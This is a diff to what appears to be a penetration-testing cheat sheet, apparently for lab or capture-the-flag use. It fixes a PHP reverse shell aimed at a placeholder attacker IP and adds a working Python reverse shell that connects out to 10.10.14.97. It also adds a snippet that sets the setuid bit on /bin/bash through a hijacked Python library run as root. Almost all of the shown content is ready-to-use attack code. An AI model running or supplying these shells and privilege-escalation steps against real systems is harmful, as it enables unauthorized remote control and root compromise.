@@ -137,8 +137,19 @@ ruby -rsocket -e 'spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.14.32","9999"
 
 **PHP revershell**  
 ```php
-<?php exec("/bin/bash -c 'bash -i > /dev/tcp/ATTACKING-IP/1234 0>&1'");
+<?php exec("/bin/bash -c 'bash -i > /dev/tcp/ATTACKING-IP/1234 0>&1'");?>
 ```
+**Python revershell**  
+```python
+import socket,subprocess,os;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("10.10.14.97",8888));
+os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);
+p=subprocess.call(["/bin/sh","-i"]);
+```
+
 **bash and netcat revershell**
 ```bash
 #victim
@@ -326,6 +337,11 @@ requests.get("http://localhost/test")
 
 def get(a):
    print("you get hacked")
+```
+If script python is execute by root
+```python
+import subprocess
+subprocess.call(["chmod","+s","/bin/bash"])
 ```
 Make sure that the requests.py file is in the same directory as your script, or is available in the Python path, so that Python can find it.  
 **eval()**
